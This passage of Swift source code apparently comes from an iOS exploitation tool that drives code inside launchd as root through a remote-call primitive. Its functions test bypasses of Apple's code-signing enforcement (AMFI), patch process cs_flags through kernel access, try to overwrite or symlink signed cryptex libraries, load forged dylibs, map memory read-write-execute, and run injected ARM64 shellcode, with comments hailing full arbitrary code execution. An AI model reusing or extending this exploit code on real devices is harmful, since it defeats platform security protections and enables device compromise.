            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        return ExperimentResult(
            name: "list cryptex dirs",
            success: true,
            detail: allResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Verify if posix_spawn ret=0 is real
    /// Write return value to memory and read back (not rely on RC return)
    private func expVerifySpawnReturn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: call posix_spawn and store return in a known location
        // Then read that location to verify
        
        // First test with a binary we KNOW doesn't exist
        let fakeBin = remote_alloc_str(rc, "/nonexistent_binary_xyz")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(fakeBin)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        
        let fakeRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, fakeBin, 0, 0, argvBase, 0)
        let fakePid = rc[pidAddr].value32()
        RootExecutor.rcall(rc, "free", fakeBin)
        
        // Now test with /sbin/mount (known to exist)
        let realBin = remote_alloc_str(rc, "/sbin/mount")
        rc[argvBase].setValue64(realBin)
        rc[argvBase + 8].setValue64(0)
        rc[pidAddr].setValue64(0)
        
        let realRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, realBin, 0, 0, argvBase, 0)
        let realPid = rc[pidAddr].value32()
        
        // If real binary spawned, kill it
        if realPid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(realPid), 9)
        }
        RootExecutor.rcall(rc, "free", realBin)
        
        // Also try getpid right after to see if we're still in launchd
        let ourPid = RootExecutor.rcall(rc, "getpid")
        
        let detail = """
        Fake binary (/nonexistent): ret=\(fakeRet), pid=\(fakePid)
        Real binary (/sbin/mount):  ret=\(realRet), pid=\(realPid)
        Still in launchd: pid=\(ourPid)
        
        If fake ret≠0 and real ret=0 → posix_spawn return is REAL
        If both ret=0 → RC wrapper always returns 0 (unreliable)
        """
        
        let isReal = fakeRet != realRet || fakeRet != 0
        return ExperimentResult(
            name: "verify spawn return",
            success: isReal,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn with pipe-based output capture
    /// Instead of file redirect, use pipe() + dup2 pattern
    /// Also: fix PID by using remote memory write directly
    private func expSpawnWithPipe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: since posix_spawn works (ret=0) but PID isn't captured,
        // and output file is empty, try a different approach:
        // 1. Create a file with known content BEFORE spawn
        // 2. Spawn /bin/df (which we know exists and ret=0)
        // 3. Use posix_spawn_file_actions to redirect stdout
        // 4. Sleep to let process finish
        // 5. Read the output file
        
        // Step 1: Write output file path
        let outFile = "/tmp/.dsp_pipe_test"
        let outAddr = remote_alloc_str(rc, outFile)
        
        // Delete old file if exists
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Step 2: Setup file actions — redirect fd 1 (stdout) to file
        let actionsAddr = mem + 0x100
        // posix_spawn_file_actions_t is opaque, typically pointer-sized
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        
        // addopen(actions, 1, path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // stderr too
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Step 3: Spawn /bin/df
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0xDEAD) // sentinel to detect if it gets written
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
        
        // Read PID area (check multiple offsets)
        let pidVal0 = rc[pidAddr].value32()
        let pidVal4 = rc[pidAddr + 4].value32()
        let pidFull = rc[pidAddr].value64()
        
        // Step 4: Wait — since we might not have PID, just sleep
        RootExecutor.rcall(rc, "usleep", 1000000) // 1 second
        
        // Also try waitpid(-1) to reap any child
        let statusAddr = mem + 0x380
        rc[statusAddr].setValue32(0)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        let waitStatus = rc[statusAddr].value32()
        
        // Step 5: Read output file
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn ret=\(ret)
        pid area: 0x\(String(format: "%x", pidVal0)) | +4: 0x\(String(format: "%x", pidVal4)) | full: 0x\(String(format: "%llx", pidFull))
        waitpid(-1, WNOHANG): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
        output file: \(readFd != UInt64(bitPattern: -1) ? "opened" : "MISSING")
        output (\(output.count) chars): \(output.prefix(300))
        """
        
        return ExperimentResult(
            name: "spawn /bin/df + pipe fix",
            success: !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan cryptex usr/libexec for available binaries
    private func expScanCryptexLibexec(rc: RemoteCall) -> ExperimentResult {
        let dirs = [
            "/private/preboot/Cryptexes/OS/usr/libexec",
            "/System/Cryptexes/OS/usr/libexec",
            "/private/preboot/Cryptexes/OS/usr/lib",
            "/System/Cryptexes/OS/usr/lib",
        ]
        
        var allEntries: [String] = []
        
        for dir in dirs {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<100 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    entries.append(name)
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allEntries.append("\(dir)/ (\(entries.count) items):")
                allEntries.append(contentsOf: entries.prefix(20).map { "  \($0)" })
                if entries.count > 20 {
                    allEntries.append("  ... +\(entries.count - 20) more")
                }
            }
        }
        
        return ExperimentResult(
            name: "cryptex libexec scan",
            success: !allEntries.isEmpty,
            detail: allEntries.isEmpty ? "No entries found" : allEntries.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn binary with stdout capture via posix_spawn_file_actions
    private func expSpawnWithOutput(rc: RemoteCall, binary: String, args: [String]) -> ExperimentResult {
        let mem = rc.trojanMem
        let outputFile = "/tmp/.dsploit_spawn_out"
        
        // Create output file first
        let outPathAddr = remote_alloc_str(rc, outputFile)
        let outFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if outFd != UInt64(bitPattern: -1) {
            RootExecutor.rcall(rc, "close", outFd)
        }
        
        // Setup posix_spawn_file_actions to redirect stdout to file
        let fileActionsAddr = mem + 0x100
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)
        
        // addopen: fd=1 (stdout) → outputFile, O_WRONLY|O_CREAT|O_TRUNC
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 1, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // Also redirect stderr (fd=2) to same file
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 2, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // Build argv
        let binAddr = remote_alloc_str(rc, binary)
        let argvBase = mem + 0x400
        var argAddrs: [UInt64] = []
        for arg in args {
            let addr = remote_alloc_str(rc, arg)
            argAddrs.append(addr)
        }
        for (i, addr) in argAddrs.enumerated() {
            rc[argvBase + UInt64(i * 8)].setValue64(addr)
        }
        rc[argvBase + UInt64(argAddrs.count * 8)].setValue64(0) // NULL
        
        // Spawn with file_actions
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, fileActionsAddr, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Wait for process to finish
        if ret == 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            if pid != 0 {
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            } else {
                // PID unknown, wait a bit
                RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
            }
        }
        
        // Read output
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outPathAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr)
        RootExecutor.rcall(rc, "free", outPathAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        for addr in argAddrs { RootExecutor.rcall(rc, "free", addr) }
        
        let success = ret == 0
        let detail = success
            ? "✅ ret=0, pid=\(pid)\nOutput:\n\(output.isEmpty ? "(no output captured)" : output.prefix(500))"
            : "❌ ret=\(ret), errno=\(remote_errno(rc))"
        
        return ExperimentResult(
            name: "spawn \(binary) + capture",
            success: success && !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    // MARK: - AMFI Bypass Research Experiments
    
    /// Write a minimal Mach-O binary to /tmp and try to spawn it
    /// Tests: does AMFI check signature on newly written files?
    private func expWriteAndSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let testBin = "/tmp/.dsp_test_bin"
        let pathAddr = remote_alloc_str(rc, testBin)
        
        // Write minimal ARM64 binary that just exits
        // This is a valid Mach-O that calls exit(42)
        // mov x0, #42; mov x16, #1; svc #0x80
        let shellcode: [UInt8] = [
            // Mach-O header (minimal)
            0xCF, 0xFA, 0xED, 0xFE, // magic: MH_MAGIC_64
            0x0C, 0x00, 0x00, 0x01, // cputype: ARM64
            0x00, 0x00, 0x00, 0x00, // cpusubtype
            0x02, 0x00, 0x00, 0x00, // filetype: MH_EXECUTE
        ]
        // Actually, writing a proper Mach-O is complex. Instead, just copy
        // an existing binary and try to spawn the copy.
        
        // Strategy: copy /bin/df to /tmp/test_bin, then spawn the copy
        // If copy can be spawned → AMFI doesn't check path, only signature!
        
        // Step 1: Read /bin/df
        let srcAddr = remote_alloc_str(rc, "/bin/df")
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        
        guard srcFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot open /bin/df", timestamp: Date())
        }
        
        // Step 2: Create destination
        let dstFd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard dstFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot create /tmp/test_bin", timestamp: Date())
        }
        
        // Step 3: Copy in chunks
        let bufAddr = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<100 { // max 100 chunks of 2KB = 200KB
            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
            if n == 0 || n > 2048 { break }
            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
            totalCopied += n
        }
        
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        RootExecutor.rcall(rc, "free", srcAddr)
        
        // Step 4: chmod +x
        RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
        
        // Step 5: Try to spawn the COPY
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(pathAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        if ret == 0 && pid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
        }
        // Wait for any child
        RootExecutor.rcall(rc, "usleep", 500000)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        RootExecutor.rcall(rc, "unlink", pathAddr)
        RootExecutor.rcall(rc, "free", pathAddr)
        
        let detail = """
        Copied /bin/df to /tmp (\(totalCopied) bytes)
        posix_spawn(/tmp/copy): ret=\(ret), pid=\(pid)
        waitpid: \(waitRet)
        
        ret=0 → AMFI accepts copied binaries! (signature travels with file)
        ret≠0 → AMFI checks path or re-validates signature
        """
        
        return ExperimentResult(name: "copy+spawn binary", success: ret == 0, detail: detail, timestamp: Date())
    }
    
    /// Try dlopen of unsigned dylib in launchd context
    private func expDlopen(rc: RemoteCall) -> ExperimentResult {
        // Try loading a system dylib first (should work)
        let sysLib = remote_alloc_str(rc, "/usr/lib/libSystem.B.dylib")
        let sysHandle = RootExecutor.rcall(rc, "dlopen", sysLib, 1) // RTLD_LAZY=1
        RootExecutor.rcall(rc, "free", sysLib)
        
        // Try loading from cryptex
        let cryptexLib = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/libstdc++.dylib")
        let cryptexHandle = RootExecutor.rcall(rc, "dlopen", cryptexLib, 1)
        RootExecutor.rcall(rc, "free", cryptexLib)
        
        // Write a minimal dylib to /tmp and try to load it
        // For now just test if dlopen works at all
        let fakeLib = remote_alloc_str(rc, "/tmp/.dsp_fake.dylib")
        // Create empty file
        let fd = RootExecutor.rcall(rc, "open", fakeLib, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", fd) }
        let fakeHandle = RootExecutor.rcall(rc, "dlopen", fakeLib, 1)
        
        // Get dlerror
        let errPtr = RootExecutor.rcall(rc, "dlerror")
        var errStr = "(no error)"
        if errPtr != 0 {
            var errBuf = [UInt8](repeating: 0, count: 200)
            rc.remoteRead(errPtr, to: &errBuf, size: 200)
            errStr = String(cString: errBuf + [0])
        }
        
        RootExecutor.rcall(rc, "unlink", fakeLib)
        RootExecutor.rcall(rc, "free", fakeLib)
        
        let detail = """
        dlopen(/usr/lib/libSystem.B.dylib): \(sysHandle != 0 ? "✅ 0x\(String(format: "%llx", sysHandle))" : "❌ NULL")
        dlopen(cryptex libstdc++): \(cryptexHandle != 0 ? "✅ 0x\(String(format: "%llx", cryptexHandle))" : "❌ NULL")
        dlopen(/tmp/fake.dylib): \(fakeHandle != 0 ? "✅ 0x\(String(format: "%llx", fakeHandle))" : "❌ NULL")
        dlerror: \(errStr.prefix(100))
        
        If system dylib loads → dlopen works in launchd
        If fake dylib loads → AMFI doesn't check dlopen! (huge!)
        """
        
        return ExperimentResult(name: "dlopen test", success: sysHandle != 0, detail: detail, timestamp: Date())
    }
    
    /// Check AMFI-related state: amfi boot-args, proc flags, etc
    private func expAMFIState(rc: RemoteCall) -> ExperimentResult {
        // Check if amfi_get_out_of_my_way is set (boot-arg)
        // Read our proc's cs_flags
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        
        // Check if we can modify cs_flags of a child process
        // Fork a child, then try to patch its cs_flags via kernel
        let childPid = RootExecutor.rcall(rc, "fork")
        var childCSFlags: UInt32 = 0
        var patchResult = "not attempted"
        
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Read child's cs_flags
            childCSFlags = mgr.readCSFlags(pid: Int32(childPid))
            
            // Try to patch child's cs_flags to add CS_DEBUGGED | CS_GET_TASK_ALLOW
            let newFlags: UInt32 = childCSFlags | 0x0000800 | 0x0004000 // CS_DEBUGGED | CS_GET_TASK_ALLOW
            let patchOk = mgr.patchCSFlags(pid: Int32(childPid), addFlags: 0x0000800 | 0x0004000)
            patchResult = patchOk.ok ? "✅ patched!" : "❌ \(patchOk.msg)"
            
            // Read back
            let afterFlags = mgr.readCSFlags(pid: Int32(childPid))
            patchResult += " (before=0x\(String(format: "%x", childCSFlags)), after=0x\(String(format: "%x", afterFlags)))"
            
            // Kill child
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, rc.trojanMem + 0x380, 0)
        }
        
        let detail = """
        launchd (PID \(pid)) cs_flags: 0x\(String(format: "%x", csflags))
        child cs_flags patch: \(patchResult)
        
        If cs_flags patchable → can mark process as CS_DEBUGGED
        CS_DEBUGGED skips some AMFI checks!
        """
        
        return ExperimentResult(name: "AMFI state + cs_flags patch", success: patchResult.contains("✅"), detail: detail, timestamp: Date())
    }
    
    // MARK: - CoreTrust / Library Hijack Research
    
    /// Try to overwrite a signed cryptex library with custom content
    /// If the overwritten library can still be dlopen'd → code injection!
    private func expLibraryHijack(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Target: a small library in cryptex that we can overwrite
        // libLogRedirect.dylib is small and non-critical
        let targetLib = "/private/preboot/Cryptexes/OS/usr/lib/libLogRedirect.dylib"
        let backupPath = "/tmp/.dsp_lib_backup"
        
        let targetAddr = remote_alloc_str(rc, targetLib)
        let backupAddr = remote_alloc_str(rc, backupPath)
        
        // Step 1: Check if we can even write to cryptex path
        let testFd = RootExecutor.rcall(rc, "open", targetAddr, UInt64(O_WRONLY), 0)
        let canWrite = testFd != UInt64(bitPattern: -1)
        if canWrite {
            RootExecutor.rcall(rc, "close", testFd)
        }
        let writeErr = remote_errno(rc)
        
        // Step 2: Try to create a NEW file in cryptex directory
        let newFileAddr = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_test")
        let newFd = RootExecutor.rcall(rc, "open", newFileAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        let canCreate = newFd != UInt64(bitPattern: -1)
        if canCreate {
            RootExecutor.rcall(rc, "close", newFd)
            RootExecutor.rcall(rc, "unlink", newFileAddr)
        }
        let createErr = remote_errno(rc)
        
        // Step 3: Try symlink in cryptex
        let symlinkTarget = remote_alloc_str(rc, "/tmp/.dsp_fake_lib")
        let symlinkPath = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_link")
        let symlinkRet = RootExecutor.rcall(rc, "symlink", symlinkTarget, symlinkPath)
        let symlinkErr = remote_errno(rc)
        if symlinkRet == 0 {
            RootExecutor.rcall(rc, "unlink", symlinkPath)
        }
        
        RootExecutor.rcall(rc, "free", targetAddr)
        RootExecutor.rcall(rc, "free", backupAddr)
        RootExecutor.rcall(rc, "free", newFileAddr)
        RootExecutor.rcall(rc, "free", symlinkTarget)
        RootExecutor.rcall(rc, "free", symlinkPath)
        
        let detail = """
        Target: \(targetLib)
        Can open for write: \(canWrite ? "✅ YES!" : "❌ NO (errno=\(writeErr))")
        Can create new file: \(canCreate ? "✅ YES!" : "❌ NO (errno=\(createErr))")
        Can create symlink: \(symlinkRet == 0 ? "✅ YES!" : "❌ NO (errno=\(symlinkErr))")
        
        If writable → can replace library content → code injection!
        If symlink works → can redirect library load to our file!
        """
        
        let anySuccess = canWrite || canCreate || symlinkRet == 0
        return ExperimentResult(name: "library hijack (cryptex write)", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    /// Try symlink attack: make /var/jb/lib point to somewhere useful
    /// Then dlopen from /var/jb/lib path
    private func expSymlinkAttack(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: DYLD searches multiple paths for libraries
        // If we can make DYLD look in /var/jb/usr/lib/ we could place our dylib there
        // But AMFI still checks signature...
        
        // Alternative: what about DYLD_INSERT_LIBRARIES?
        // In launchd context, can we set env var and spawn?
        
        // Test: create a file at /var/jb/usr/lib/test.dylib
        // Then try dlopen with that path
        let testLib = "/var/jb/usr/lib/test.dylib"
        let testAddr = remote_alloc_str(rc, testLib)
        
        // Write minimal "dylib" (just MH_MAGIC to see if dlopen even tries)
        let fd = RootExecutor.rcall(rc, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fd != UInt64(bitPattern: -1) {
            // Write Mach-O magic + minimal header
            let bufAddr = mem + 0x800
            // MH_MAGIC_64 + CPU_TYPE_ARM64 + MH_DYLIB
            let header: [UInt8] = [
                0xCF, 0xFA, 0xED, 0xFE, // magic
                0x0C, 0x00, 0x00, 0x01, // cputype ARM64
                0x00, 0x00, 0x00, 0x00, // cpusubtype
                0x06, 0x00, 0x00, 0x00, // filetype MH_DYLIB
                0x00, 0x00, 0x00, 0x00, // ncmds
                0x00, 0x00, 0x00, 0x00, // sizeofcmds
                0x85, 0x00, 0x20, 0x00, // flags
                0x00, 0x00, 0x00, 0x00, // reserved
            ]
            var headerCopy = header
            rc.remote_write(bufAddr, from: &headerCopy, size: UInt64(header.count))
            RootExecutor.rcall(rc, "write", fd, bufAddr, UInt64(header.count))
            RootExecutor.rcall(rc, "close", fd)
        }
        
        // Try dlopen
        let handle = RootExecutor.rcall(rc, "dlopen", testAddr, 1)
        let errPtr = RootExecutor.rcall(rc, "dlerror")
        var errStr = ""
        if errPtr != 0 {
            var errBuf = [UInt8](repeating: 0, count: 300)
            rc.remoteRead(errPtr, to: &errBuf, size: 300)
            errStr = String(cString: errBuf + [0])
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", testAddr)
        RootExecutor.rcall(rc, "free", testAddr)
        
        let detail = """
        Wrote fake dylib to \(testLib)
        dlopen result: \(handle != 0 ? "✅ LOADED! 0x\(String(format: "%llx", handle))" : "❌ NULL")
        dlerror: \(errStr.prefix(200))
        
        Error tells us WHY it failed:
        - "code signature" → AMFI checks signature
        - "not a valid" → format issue (expected)
        - "no suitable image" → DYLD rejects
        """
        
        return ExperimentResult(name: "fake dylib dlopen", success: handle != 0, detail: detail, timestamp: Date())
    }
    
    /// Try to use already-loaded library + overwrite function pointers
    private func expFunctionSwap(rc: RemoteCall) -> ExperimentResult {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        let funcAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getuid"))
        let mallocAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "malloc"))
        
        var canReadFunc = false
        if funcAddr != 0 && ds_isvalid(funcAddr) {
            let val = ds_kread64_safe(funcAddr)
            canReadFunc = val != 0
        }
        
        // mmap RWX
        let mmapAddr = RootExecutor.rcall(rc, "mmap", 0, 0x4000, 7, 0x1002, UInt64(bitPattern: Int64(-1)), 0)
        
        let detail = """
        getuid addr: 0x\(String(format: "%llx", funcAddr))
        malloc addr: 0x\(String(format: "%llx", mallocAddr))
        can read via kernel: \(canReadFunc)
        mmap(RWX): \(mmapAddr != UInt64(bitPattern: -1) ? "✅ 0x\(String(format: "%llx", mmapAddr))" : "❌ FAILED")
        
        If mmap(RWX) works → can write+execute shellcode in launchd!
        This would be FULL arbitrary code execution!
        """
        
        if mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0 {
            RootExecutor.rcall(rc, "munmap", mmapAddr, 0x4000)
        }
        
        return ExperimentResult(
            name: "mmap RWX + function addrs",
            success: mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0,
            detail: detail,
            timestamp: Date()
        )
    }
    
    // MARK: - Shellcode Execution Experiments
    
    /// Find a writable region in launchd's executable pages
    /// If we can write to __TEXT, we can inject code without mmap
    private func expFindWritableCodePage(rc: RemoteCall) -> ExperimentResult {
        // Strategy: RemoteCall's trojanMem is in launchd's address space
        // Check if any nearby pages are executable
        // Also: check if we can mprotect existing pages to add PROT_EXEC
        
        let mem = rc.trojanMem
        
        // Test 1: Can we mprotect trojanMem to be executable?
        let pageAddr = mem & ~0x3FFF // align to 16KB page
        let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
        let mprotectErr = remote_errno(rc)
        
        // Test 2: Try to find __TEXT segment of launchd
        // dlsym gives us addresses in executable pages
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let getpidAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getpid"))
        
        // Test 3: Can we write to code page? (probably not — W^X)
        // Read current value at getpid, try write, read back
        var origBytes = [UInt8](repeating: 0, count: 4)
        var canWriteCode = false
        if getpidAddr != 0 {
            rc.remoteRead(getpidAddr, to: &origBytes, size: 4)
            // Try writing (will likely fail silently or crash)
            // DON'T actually write to getpid — just test nearby padding
            let testAddr = getpidAddr + 0x1000 // some offset into padding
            var testByte: UInt8 = 0
            rc.remoteRead(testAddr, to: &testByte, size: 1)
            let origByte = testByte
            testByte = 0x42
            rc.remote_write(testAddr, from: &testByte, size: 1)
            var readBack: UInt8 = 0
            rc.remoteRead(testAddr, to: &readBack, size: 1)
            canWriteCode = (readBack == 0x42)
            // Restore
            if canWriteCode {
                var restore = origByte
                rc.remote_write(testAddr, from: &restore, size: 1)
            }
        }
        
        let detail = """
        trojanMem: 0x\(String(format: "%llx", mem))
        mprotect(trojanMem, RWX): \(mprotectRet == 0 ? "✅ SUCCESS!" : "❌ ret=\(mprotectRet), errno=\(mprotectErr)")
        getpid addr (code page): 0x\(String(format: "%llx", getpidAddr))
        can write to code page: \(canWriteCode ? "✅ YES!" : "❌ NO")
        
        If mprotect RWX works → can make trojanMem executable → shellcode!
        If write to code works → can patch existing code → inject!
        """
        
        return ExperimentResult(
            name: "find writable code page",
            success: mprotectRet == 0 || canWriteCode,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// SHELLCODE EXECUTION via mprotect'd trojanMem!
    /// trojanMem is already writable. mprotect(RWX) confirmed working.
    /// Write shellcode → call it as function → if returns 42 = FULL CODE EXEC!
    /// ⚠️ MAY CAUSE PANIC if APRR still blocks at hardware level
    private func expShellcodeViaMprotect(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Use a safe offset in trojanMem for shellcode (don't overwrite RC data)
        let codeAddr = mem + 0xF00 // offset 0xF00 — safe area
        
        // Step 1: mprotect the page to RWX
        let pageAddr = codeAddr & ~0x3FFF // align to 16KB page
        let mprotRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
        
        guard mprotRet == 0 else {
            return ExperimentResult(name: "shellcode (mprotect)", success: false, detail: "mprotect failed: \(mprotRet)", timestamp: Date())
        }
        
        // Step 2: Write shellcode: mov x0, #42; ret
        var shellcode: [UInt8] = [
            0x40, 0x05, 0x80, 0xD2,  // mov x0, #42
            0xC0, 0x03, 0x5F, 0xD6,  // ret
        ]
        rc.remote_write(codeAddr, from: &shellcode, size: UInt64(shellcode.count))
        
        // Step 3: Clear instruction cache (important for ARM!)
        // sys_icache_invalidate equivalent
        RootExecutor.rcall(rc, "sys_icache_invalidate", codeAddr, UInt64(shellcode.count))
        
        // Step 4: Call shellcode as function via RemoteCall
        // RemoteCall will PAC-sign the pointer before jumping
        var noArgs: [UInt64] = [0]
        let result = "mprotect_shellcode".withCString { cName -> UInt64 in
            UInt64(noArgs.withUnsafeMutableBufferPointer { buffer in
                rc.doStable(
                    withTimeout: 5,
                    functionName: UnsafeMutablePointer(mutating: cName),
                    functionPointer: UnsafeMutableRawPointer(bitPattern: UInt(codeAddr)),
                    args: buffer.baseAddress,
                    argCount: 0
                )
            })
        }
        
        let success = result == 42
        let detail = """
        trojanMem: 0x\(String(format: "%llx", mem))
        code addr: 0x\(String(format: "%llx", codeAddr))
        mprotect(RWX): ✅
        shellcode: mov x0, #42; ret
        RESULT: \(result) \(success ? "🎉🎉🎉 SHELLCODE EXECUTED!!!" : "❌ (APRR may still block)")
        
        \(success ? "FULL ARBITRARY CODE EXECUTION ACHIEVED!\nWe can run ANY ARM64 code as root!" : "If 0 or crash → APRR hardware still enforces W^X\nIf non-42 → PAC or other issue")
        """
        
        return ExperimentResult(name: "⚡ SHELLCODE (mprotect)", success: success, detail: detail, timestamp: Date())
    }
    
    /// Fork child, keep it alive, try to execve in it
